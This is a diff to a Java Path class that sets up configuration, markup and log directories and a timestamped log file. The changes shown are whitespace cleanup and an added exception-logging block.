@@ -39,7 +39,7 @@ public class Path {
 	private static String LOG_DIR; //$NON-NLS-1$
 
 	private static String curLogFile;
-	
+
 	public static final String LOG_FILE = "logs"; //$NON-NLS-1$
 
 	/** The hidden. */
@@ -50,7 +50,7 @@ public class Path {
 	// public static final String UPLOAD_DIR = "";
 
 	private Path() {
-		
+
 	}
 
 	/**
@@ -86,20 +86,20 @@ public class Path {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (makeDirs): hidden = " + hidden());//$NON-NLS-1$
 				}
-				
+
 				boolean success = true;
-				
+
 				success &= createDirectory(conf());
 				success &= createDirectory(markup());
 				success &= createDirectory(logs());
 
 				if (Cfg.FILE) {
 					DateTime dt = new DateTime();
-					
+
 					curLogFile = LOG_FILE + "-" + dt.getOrderedString() + ".txt";
-					
+
 					final File file = new File(logs(), curLogFile);
-					
+
 					file.createNewFile();
 				}
 
@@ -107,18 +107,22 @@ public class Path {
 				return success;
 			}
 		} catch (final Exception e) {
+			if (Cfg.EXCEPTION) {
+				Check.log(e);
+			}
+
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " Error: " + e.toString());//$NON-NLS-1$
 			}
 		}
-		
+
 		return false;
 	}
 
 	public static String getCurLogfile() {
 		return curLogFile;
 	}
-	
+
 	/**
 	 * Check.storage. //$NON-NLS-1$
 	 */
